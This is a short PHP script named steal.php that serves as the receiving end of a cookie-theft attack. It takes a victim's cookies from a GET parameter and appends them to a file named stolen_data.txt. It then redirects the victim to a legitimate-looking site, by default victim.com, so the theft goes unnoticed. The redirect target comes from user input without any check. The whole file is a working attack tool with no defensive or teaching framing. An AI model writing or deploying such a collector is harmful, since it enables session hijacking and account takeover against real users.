<?php
// steal.php

// Capture cookies from the GET request
$cookies = $_GET['cookie'] ?? 'No cookies';
$redirect = $_GET['redirect'] ?? 'http://victim.com';

// Log the stolen cookies
$file = fopen('stolen_data.txt', 'a');
fwrite($file, "Cookies: " . $cookies . "\n");
fclose($file);

// Redirect the victim to the legitimate site
header("Location: " . $redirect);
exit();
?>
